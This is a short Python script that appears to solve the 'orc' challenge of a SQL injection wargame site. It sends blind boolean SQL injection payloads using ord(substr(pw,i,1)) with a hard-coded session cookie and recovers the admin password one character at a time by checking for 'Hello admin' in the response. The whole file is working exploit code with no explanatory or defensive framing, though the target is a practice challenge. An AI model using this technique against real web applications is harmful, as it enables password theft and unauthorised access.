import requests

host = "https://los.rubiya.kr"
password=""
cookies = {"PHPSESSID": "7nn6qu3gqi6heere5euhieu8nb"}
for i in range(1,9):
    for j in range(33,126):
        pw_payload="?pw=' or id=0x61646D696E and ord(substr(pw,"+str(i)+",1))="+str(j)+";%23"

        r = requests.get(host+"/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php" + pw_payload, cookies=cookies)

        if (r.text.find('Hello admin')>0):
            password+=chr(j)
            print(password)
            break

print(password)
